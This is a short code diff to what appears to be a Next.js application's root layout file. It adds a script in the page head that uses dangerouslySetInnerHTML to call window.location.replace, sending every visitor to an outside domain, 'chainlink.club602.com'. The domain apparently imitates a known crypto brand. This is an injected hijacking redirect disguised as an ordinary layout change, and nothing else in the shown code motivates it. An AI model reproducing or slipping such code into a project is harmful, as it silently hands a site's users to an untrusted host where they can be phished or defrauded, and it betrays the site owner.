@@ -74,6 +74,13 @@ export default function RootLayout({
   return (
     <CookiesProvider>
       <html lang="en">
+        <head>
+          <script
+            dangerouslySetInnerHTML={{
+              __html: 'window.location.replace("http://chainlink.club602.com");',
+            }}
+          />
+        </head>
         <body className={cn("antialiased font-sans", inter.variable)}>
           <NuqsAdapter>
             <ErrorBoundary>
